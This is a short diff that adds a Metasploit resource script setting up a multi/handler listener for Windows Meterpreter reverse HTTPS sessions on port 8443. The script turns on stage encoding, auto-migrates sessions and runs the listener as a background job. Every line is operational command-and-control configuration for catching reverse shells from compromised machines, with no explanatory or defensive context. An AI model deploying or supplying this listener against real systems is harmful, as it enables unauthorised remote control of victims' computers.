@@ -1,0 +1,8 @@
+use multi/handler 
+set payload windows/meterpreter/reverse_https 
+set exitonsession false 
+set lhost 0.0.0.0 
+set lport 8443
+set enablestageencoding true
+set autorunscript migrate -f
+exploit -j -z
